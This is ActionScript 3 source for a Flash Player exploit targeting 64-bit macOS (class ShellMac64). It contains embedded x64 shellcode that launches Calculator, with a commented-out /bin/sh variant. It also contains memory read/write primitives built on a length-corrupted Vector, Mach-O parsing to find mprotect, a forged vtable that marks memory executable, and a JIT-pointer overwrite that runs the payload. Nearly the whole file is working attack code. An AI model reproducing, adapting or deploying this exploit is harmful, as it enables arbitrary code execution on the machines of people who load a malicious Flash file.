package
{
	import flash.utils.ByteArray;
	import flash.utils.Endian;
	import flash.system.Capabilities;
	
	class ShellMac64 extends MyClass
	{
		static var
			_v:Vector.<uint>,	// uint vector with corrupted length
			_vAddr:Number,		// _v[0] address
			_base:Number,
			_baseMax:Number,
			_baseOld:Number,
			_mc:MyClass2,		// descendant of ByteArray allocated right after _v[]
			_mcOffs:uint,		// index of mc.o1 within _v[]
			N32:Number 			= Math.pow(2,32),
			
			// x64 shellcode 
			_x64:Vector.<uint> = MyUtils.ToUintVector([
				// "calculator" payload
				0x90,0x90,0x90,0x90,								// nops, just in case for alignment
				0x56,0x57,											// push rsi; push edi
				0x48,0x31,0xc0,                                		// xor rax, rax	
				0x50, 												// push rax 
				0x48,0x89,0xe6,                                		// mov rsi, rsp // local var = 0
				
				0x48,0xb8,0x42,0,0,2,0,0,0,0,						// mov rax, 0x2000042		
				0x0f,0x05,                                      	// syscall vfork()			
				0x83,0xf8,1,										// cmp eax,1 
				0x74,0x69,											// je @@end // sandbox denied vfork()
				0x48,0x83,0x3e,0x00, 								// cmp [rsi],0
				0x75,0x63, 											// jne @@end // if (var != 0) skip execve() for parent process
				
					0x48,0xb8,0x3b,0,0,2,0,0,0,0,						// mov rax, 0x200003b
					0x48,0x89,0x06, 									// mov [rsi], rax // set var != 0
					0xe8,0x37,0,0,0, 									// call +55 // push string address
					// db '/Applications/Calculator.app/Contents/MacOS/Calculator'
					0x2F,0x41,0x70,0x70,0x6C,0x69,0x63,0x61,0x74,0x69,0x6F,0x6E,0x73,0x2F,0x43,0x61,0x6C,0x63,
					0x75,0x6C,0x61,0x74,0x6F,0x72,0x2E,0x61,0x70,0x70,0x2F,0x43,0x6F,0x6E,0x74,0x65,0x6E,0x74,
					0x73,0x2F,0x4D,0x61,0x63,0x4F,0x53,0x2F,0x43,0x61,0x6C,0x63,0x75,0x6C,0x61,0x74,0x6F,0x72,0x00,
					//0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00, 			// db '/bin/sh' // update @@end offset too !!!
					0x5f,												// pop rdi // pop string address into rdi
					0x48,0x31,0xd2,                                		// xor rdx, rdx
					0x52,                                        		// push rdx
					0x57,                                        		// push rdi
					0x48,0x89,0xe6,                                		// mov rsi, rsp
					0x0f,0x05,                                      	// syscall execve()
					0x48,0xb8,1,0,0,2,0,0,0,0,							// mov rax, 0x2000001
					0x48,0x31,0xff,										// xor rdi,rdi
					0x0f,0x05,                                      	// syscall exit // exit child process if execve() failed
				
				// @@end
				//0x90,0x90,0x90,0x90,  0x90,0x90,0x90,0x90,  0x90,0x90,0x90,0x90,  0x90,0x90,0x90,0x90,
				//0x90,0x90,0x90,0x90,  0x90,0x90,0x90,0x90,  0x90,0x90,0x90,0x90,  0x90,0x90,0x90,0x90,
				0x5e, 												// pop rsi // restore esp
				
				/*
				// "empty" payload 
				0x90,0x90,0x90,0x90,  0x90,0x90,0x90,0x90,  0x90,0x90,0x90,0x90,  0x90,0x90,0x90,0x90,
				0x90,0x90,0x90,0x90,  0x90,0x90,0x90,0x90,  0x90,0x90,0x90,0x90,  0x90,0x90,0x90,0x90,
				0x90,0x90,0x90,0x90,  0x90,0x90,0x90,0x90,  0x90,0x90,0x90,0x90,  0x90,0x90,0x90,0x90,
				0x90,0x90,0x90,0x90,  0x90,0x90,0x90,0x90,  0x90,0x90,0x90,0x90,  0x90,0x90,0x90,0x90,				
				// returns 12345678
				//0x48,0xB8,0x4E,0x61,0xBC,0,0,0,0,0, 				// mov rax, 0xBC614E				
				0xC3												// ret
				*/
				
				0x48,0xC1,0xE0,0x03,								// shl rax,3;
				0x48,0x83,0xC0,0x06,								// add rax,6;	// set rax to AS3 int atom
				0x5f,0x5e,											// pop edi; pop rsi
				0xC3												// ret
			]);
			
		// converts two uints to hex string
		static function Hex(n:Number):String
		{
			if (n >= 0 && n <= 9) return n.toString() 
			else return "0x" + n.toString(16);
		}			
		
		// init global vars
		static function Init(v:Vector.<uint>, offs:uint, mc:MyClass2, mcOffs:uint):Boolean
		{
			_v = v; _mc = mc; _mcOffs = mcOffs;
			
			_vAddr = Get64(mcOffs, 0xfffff000) - offs + 0x10;
			_baseOld = Get64(mcOffs-8);
			logAdd("v[0] address = " + Hex(_vAddr));
			logAdd("mc old base = " + Hex(_baseOld));
			
			// prepare new base for mc
			v[6] = 0xffffffff; // ByteArray::capacity
			v[7] = 0xfffffffe; // ByteArray::length
			mc.endian = Endian.LITTLE_ENDIAN;
			
			// set new base
			Set64(mcOffs-8, _vAddr);
			_base = 0;
			_baseMax = 0xfffffff0;
			
			// check results
			var len:uint = mc.length;
			logAdd("mc.length = " + Hex(len));
			return len == v[7];
		}		
		
		// restores corrupted memory
		static function CleanUp()
		{
			// restore _v.length
			Set32(_vAddr - 0x10, 0x3f0);
			
			_v[6] = 0; // _mc.capacity
			_v[7] = 0; // _mc.length
		}
		
		// join two uints as uint64
		static function Num(low:uint, hi:uint):Number
		{
			var n:Number = hi;
			if (n != 0) n *= N32;
			n += low;
			return n;
		}
		
		// get high uint from uint64
		static function Hi(n:Number):uint
		{	
			return uint(Math.floor(n / N32) & (N32-1));
		}
		
		// get low uint from uint64
		static function Low(n:Number):uint
		{	
			return uint(n & (N32-1));
		}
		
		// reads uint64 from _v[]
		static function Get64(offs:uint, mask:uint = 0xffffffff):Number
		{
			return Num(_v[offs] & mask, _v[offs+1]);
		}
			
		// writes uint64 into _v[]
		static function Set64(offs:uint, n:Number)
		{
			_v[offs] = Low(n);
			_v[offs+1] = Hi(n);
		}
			
		// sets new address pointer for _mc[0]
		static function SetBase(addr:Number)
		{
			if (addr < _base || addr >= _baseMax) {
				Set64(4, addr); // _v[4],[5]
				_base = addr;
				_baseMax = addr + 0xfffffff0;
			}
		}
		
		// reads uint from the memory address
		static function Get32(addr:Number):uint
		{
		 	if (addr < 0x10000) throw new Error("Get32() at addr = " + Hex(addr)); // bad pointer
			
			SetBase(addr);
			_mc.position = uint((addr - _base) & (N32-1));
			return _mc.readUnsignedInt();
		}
		
		// writes uint into the memory address
		static function Set32(addr:Number, u:uint)
		{
		 	if (addr < 0x10000) throw new Error("Set32() to addr = " + Hex(addr)); // bad pointer
			
			SetBase(addr);
			_mc.position = uint((addr - _base) & (N32-1));
			_mc.writeUnsignedInt(u);
		}	
		
		// reads uint64 from the memory address
		static function Get(addr:Number):Number
		{
		 	if (addr < 0x10000) throw new Error("Get() at addr = " + Hex(addr)); // bad pointer
			
			SetBase(addr);
			_mc.position = uint((addr - _base) & (N32-1));
			var lo:uint = _mc.readUnsignedInt();
			var hi:uint = _mc.readUnsignedInt();
			return Num(lo,hi);
		}
		
		// writes uint64 into the memory address
		static function Set(addr:Number, n:Number)
		{
		 	if (addr < 0x10000) throw new Error("Set() to addr = " + Hex(addr)); // bad pointer
			
			SetBase(addr);
			_mc.position = uint((addr - _base) & (N32-1));
			_mc.writeUnsignedInt(Low(n));
			_mc.writeUnsignedInt(Hi(n));
		}		
		
		// returns object's address 
		static function GetAddr(obj:Object):Number
		{
			_mc.o1 = obj;
			return Get64(_mcOffs) - 1; // atom decrement
		}
		
		// get memory dump // for RnD
		static function Dump(addr:Number, len:uint):String
		{
			var str:String = "";
			for(var i:uint; i < len; i++, addr+=8) {
				str += Get(addr).toString(16) + ",";
				if (i % 8 == 7) str += "<br>";
			}
			return str;
		}
		
		// searches for the mprotect() address
		static function FindMP():Number
		{ 
			try 
			{				
				// find Mach64 header
				var b:Number = Get64(_mcOffs-4, 0xfffff000) - (Capabilities.playerType == "StandAlone" ? 0x1300000 : 0x1900000);
				//logAdd("b = " + Hex(b));
				for(var i:uint; i < 0x100; i++, b -= 0x1000){
					// check 'FEEDFACF'
					if (Get32(b) == 0xfeedfacf) { logAdd("module base = " + Hex(b)); break; } 
				}
				if (i >= 0x100) throw new Error("can't find FEEDFACF at " + Hex(b));
			
				// get number of load commands
				var lcn:uint = Get32(b + 0x10);
				var stub:Number = 0, sym:Number = 0, isym:Number = 0, str:Number = 0, s:Number, link:Number = 0, offs:Number = 0,  
					symCnt:uint, strCnt:uint, stubCnt:uint, stubIdx:uint, stubSize:uint, f:uint;
					
				// find LC_SEGMENT_64, LC_SYMTAB and LC_DYSYMTAB segments
				for(var lc:Number = b + 0x20; lcn > 0; lcn--) {
					f = Get32(lc);
					// check for LC_SEGMENT_64
					if (stub == 0 && f == 0x19) {
						// get number of sections 
						var sn:uint = Get32(lc + 0x40); 
						for(s = lc + 0x48; sn > 0; sn--, s+=0x50) {
							f = Get32(s + 0x40);
							// check S_SYMBOL_STUBS and S_ATTR_PURE_INSTRUCTIONS section flags
							if ((f & 0xff) == 8 && (f & 0x80000000) != 0) {
								stub = Get(s + 0x20);
								if (stub < b || stub <= Get32(s + 0x30)) stub += b;
								stubIdx = Get32(s + 0x44);
								stubSize = Get32(s + 0x48);
								if (stubSize == 6) stubCnt = Get32(s + 0x28) / stubSize;
								break;
							}
						}							
					}
					// get _LINKEDIT offset
					else if (f == 0x19 && Get32(lc + 0xa) == 0x4b4e494c) {
						link = Get(lc + 0x28)
						offs = Get(lc + 0x18);
						if (offs > b) offs -= b;
						offs -= link;
					}					
					// check for LC_SYMTAB
					else if (sym == 0 && f == 2) {
						sym = b + Get32(lc + 8);
						symCnt = Get32(lc + 12);
						str = b + Get32(lc + 16);
						strCnt = Get32(lc + 20);
					}
					// check for LC_DYSYMTAB
					else if (isym == 0 && f == 11) {
						isym = b + Get32(lc + 0x38);
					}

					if (stub != 0 && sym != 0 && isym != 0) break;
					
					// move to the next LC
					lc += Get32(lc + 4);
				}
						
				// check results
				if (stub <= b || stubCnt == 0 || sym <= b || str <= b || isym <= b)
					throw new Error("stub = " + Hex(stub) + ", stubCnt = " + stubCnt + ", stubSize = " + stubSize 
									+ ", isym = " + Hex(isym) + ", sym = " + Hex(sym) + ", str = " + Hex(str));
				
				// add _LINKEDIT segment offset
				if (offs > 0) {
					link += b;
					if (sym >= link) sym += offs;
					if (isym >= link) isym += offs;
					if (str >= link) str += offs;
				}
			
				//logAdd("stub = " + Hex(stub) + ", stubCnt = " + stubCnt + ", stubSize = " + stubSize + ", isym = " + Hex(isym) 
					   //+ ", sym = " + Hex(sym) + ", str = " + Hex(str) + ", link = " + Hex(link) + ", offs = " + Hex(offs));		
			 
				// find '_mprotect' symbol 
				for(i=0; i < stubCnt; i++, isym+=4) {
					// get symbol index
					f = Get32(isym);
					if (f == 0 || f > symCnt) throw new Error("isym = " + Hex(isym) + " -> " + Hex(f));
					
					// get string index
					f = Get32(sym + f*16);
					if (f == 0 || f > strCnt) throw new Error("sym = " + Hex(sym) + " -> " + Hex(f));
					
					// compare string with '_mpr' and 'ect'0
					if (Get32(str + f) == 0x72706d5f && Get32(str + f+6) == 0x746365) {
						// check stub pointer
						stub += i*stubSize;
						f = Get32(stub);
						if ((f & 0xffff) == 0x25ff) return stub; // ok
						
						logAdd('_mprotect stub = ' + Hex(stub) + " -> " + Hex(f));
						break;
					}
				}
				
				if (i >= stubCnt) throw new Error("can't find '_mprotect' stub");
			} 
			catch (e:Error) 
			{
				logAdd("FindMP() " + e.toString());
			}
			
			return 0;
		}
		
		// declare dummy victim function
		static function Payload(...a){}				
		
		// corrupts Payload function and calls mprotect()
		static function CallMP(mp:Number):Number
		{
			// generate Payload() function object
			Payload();
			Payload.call(null);

			// find vtable pointer in Payload()
			var p:Number = GetAddr(Payload);
			var ptbl:Number = Get(Get(Get(p + 0x10) + 0x28) + 8) + (_isDbg ? 0x120:0x108);
			// save old pointers
			var p1:Number = Get(ptbl);
			var p2:Number = Get(p+0x38);
			var p3:Number = Get(p+0x40);
			var p4:Number = Get(p1-8);
			//logAdd(Dump(p,16) + "<br>" + Hex(p1) + ", " + Hex(p2) + ", " + Hex(p3));
			
			// allocate storage for payload and get his address
			var len:uint = _x64.length;
			var v:Vector.<uint> = new Vector.<uint>(Math.max(0x700, len + 0x400));
			var vAddr:Number = GetAddr(v);
			logAdd("x64[] object = " + Hex(vAddr));
			vAddr += _isDbg ? 0x38 : 0x30;
			if (Get(vAddr) < 0x10000) vAddr -= 8; // for FP 11.4
			vAddr = Get(vAddr) + 0x10;
			var u:uint = (0x1000 - (vAddr & 0xfff)) >>> 2;
			vAddr += u*4; // for page alignment
			logAdd("x64[] data = " + Hex(vAddr));
			_gc.push(v);
			
			// create copy of vtable
			var j:uint = u;
			for(var i:uint; i < 0x100; i++, j++) v[j] = Get32(p1 + i*4);
			var p11:Number = Get(p1)-0x100;
			for(i=0; i < 0x200; i++, j++) v[j] = Get32(p11 + i*4);
			// set new vtable pointer 
			v[u-2] = Low(p4); 
			v[u-1] = Hi(p4);
			v[u+0] = Low(vAddr + 0x140*4); 
			v[u+1] = Hi(vAddr + 0x140*4); 			
			// redirect one method pointer to mprotect()
			v[u+0x140 + 16] = Low(mp); 
			v[u+0x140 + 17] = Hi(mp); 
			
			// set second arg for mprotect()
			Set(p+0x38, 0x1000 * ((len >>> 12) + 1));
			// set third arg = 7 = PROT_READ + PROT_WRITE + PROT_EXEC
			Set(p+0x40, 7);
			
			// replace vtable pointer in Payload() and set first arg for mprotect()
			Set(ptbl, vAddr);
			
			// call mprotect(vAddr, size, 7)
			Payload.call(null);
			
			// restore old pointers
			Set(ptbl, p1);
			Set(p+0x38, p2);
			Set(p+0x40, p3);
			
			// copy _x64[] into v[]
			for(i=0; i < len; i++, u++) v[u] = _x64[i];
			
			// return pointer to payload
			return vAddr;
		}
		
		
		//
		static function Exec()
		{										
			try 
			{													
				// find mprotect() address
				var mpAddr:Number = FindMP();
				logAdd("mprotect() address = " + Hex(mpAddr));
				
				// call mprotect()
				var xAddr:Number = CallMP(mpAddr);	
		
				// find Payload JIT code pointer
				var payAddr:Number = GetAddr(Payload);
				logAdd("Payload() object = " + Hex(payAddr));
				payAddr = Get(Get(payAddr + 0x38) + 0x10) + 8;
				var old:Number = Get(payAddr);
				//logAdd("Payload() address = " + Hex(old));
				
				// replace JIT pointer by payload pointer
				Set(payAddr, xAddr);		
				
				// call x64 payload
				var res = Payload.call(null);
				logAdd("Payload(): vfork() returns " + res + (res == 1 ? " (in sandbox)":" (pid)"));
					
				// restore old pointer
				Set(payAddr, old);
			}
			catch (e:Error) 
			{
				logAdd("Exec() " + e.toString());
			}
			
			CleanUp();
		}

	}

}